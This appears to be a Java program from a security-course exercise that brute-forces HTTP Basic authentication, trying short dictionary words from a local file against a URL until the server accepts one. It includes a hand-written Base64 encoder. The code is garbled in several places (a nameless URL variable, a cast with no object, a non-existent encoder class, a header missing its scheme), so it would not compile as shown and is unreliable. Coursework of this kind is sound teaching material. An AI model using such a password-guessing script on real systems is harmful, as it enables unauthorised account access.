

import java.awt.*;
import java.util.*;
import java.net.*;
import java.io.*;
import java.*;

 
public class Dictionary 
{

    public static void main(String args[]) throws Exception
    {
       
        String urlPath = null;
        
        if(args.length > 0)
        {
            urlPath = args[0];
            System.out.println("URL " + urlPath);
            Dictionary dict = new Dictionary(urlPath);            
        }
        else{
            System.out.println("Please enter URL at command prompt");
            System.out.println("eg. >java Dictionary http://sec-crack.cs.rmit.edu./SEC/2/");
        }

        System.exit(0);

    }

    
    public Dictionary(String urlPath) throws Exception
    {
        linkToWeb(urlPath);

    }

    public boolean linkToWeb(String urlPath) throws Exception
    {
        HttpURLConnection connection;
        String word = null;
        String usrName = "";
        String usrNamePwd = null;
        String encoding = null;
        URL  = new URL(urlPath);


        BufferedReader inputStream = new BufferedReader(new FileReader("words"));
        word  = inputStream.readLine();    

        while(word != null)
        {
            
            if(word.length() <= 3){

                usrNamePwd = usrName +":"+ word;
                encoding = new url.misc.BASE64Encoder().encode (usrNamePwd.getBytes());
                connection = (HttpURLConnection).openConnection();
                connection.setRequestProperty("Authorization", " " + encoding);
            
                System.out.println(word);

                if(connection.getResponseCode() == 200){  
                    System.out.println("Password Found " +word); 
                    return true;
                }
                connection.disconnect();
            }
            word  = inputStream.readLine();     

        }

        System.out.println("Password not found" );
        return false;

    }



    public class  Base64Converter
    {

     public final char [ ]  alphabet = {
        'A', 'B', 'C', 'D', 'E', 'F', 'G', 'H',   
        'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P',   
        'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X',   
        'Y', 'Z', 'a', 'b', 'c', 'd', 'e', 'f',   
        'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n',   
        'o', 'p', 'q', 'r', 's', 't', 'u', 'v',   
        'w', 'x', 'y', 'z', '0', '1', '2', '3',   
        '4', '5', '6', '7', '8', '9', '+', '/' }; 

     public String  encode ( String  s )
     {
        return encode ( s.getBytes ( ) );
     }

     public String  encode ( byte [ ]  octetString )
     {
        int  bits24;
        int  bits6;

       char [ ]  out
          = new char [ ( ( octetString.length - 1 ) / 3 + 1 ) * 4 ];

       int outIndex = 0;
        int i        = 0;

       while ( ( i + 3 ) <= octetString.length )
        {
          
          bits24  = ( octetString [ i++ ] & 0xFF ) << 16; 
          bits24 |= ( octetString [ i++ ] & 0xFF ) <<  8; 
          bits24 |= ( octetString [ i++ ] & 0xFF ) <<  0;

         bits6 = ( bits24 & 0x00FC0000 ) >> 18; 
          out [ outIndex++ ] = alphabet [ bits6 ];
          bits6 = ( bits24 & 0x0003F000 ) >> 12; 
          out [ outIndex++ ] = alphabet [ bits6 ];
          bits6 = ( bits24 & 0x00000FC0 ) >> 6; 
          out [ outIndex++ ] = alphabet [ bits6 ];
          bits6 = ( bits24 & 0x0000003F );
          out [ outIndex++ ] = alphabet [ bits6 ]; 
        }

       if ( octetString.length - i == 2 )
        {
          
          bits24  = ( octetString [ i     ] & 0xFF ) << 16; 
          bits24 |= ( octetString [ i + 1 ] & 0xFF ) <<  8;

         bits6 = ( bits24 & 0x00FC0000 ) >> 18;
          out [ outIndex++ ] = alphabet [ bits6 ]; 
          bits6 = ( bits24 & 0x0003F000 ) >> 12; 
          out [ outIndex++ ] = alphabet [ bits6 ]; 
          bits6 = ( bits24 & 0x00000FC0 ) >> 6; 
          out [ outIndex++ ] = alphabet [ bits6 ];

         
          out [ outIndex++ ] = '='; 
        }
        else if ( octetString.length - i == 1 )
        {
          
          bits24 = ( octetString [ i ] & 0xFF ) << 16;

         bits6 = ( bits24 & 0x00FC0000 ) >> 18;
          out [ outIndex++ ] = alphabet [ bits6 ];
          bits6 = ( bits24 & 0x0003F000 ) >> 12; 
          out [ outIndex++ ] = alphabet [ bits6 ];

         
          out [ outIndex++ ] = '='; 
          out [ outIndex++ ] = '='; 
        }

       return new String ( out );
      }

    }



    
}

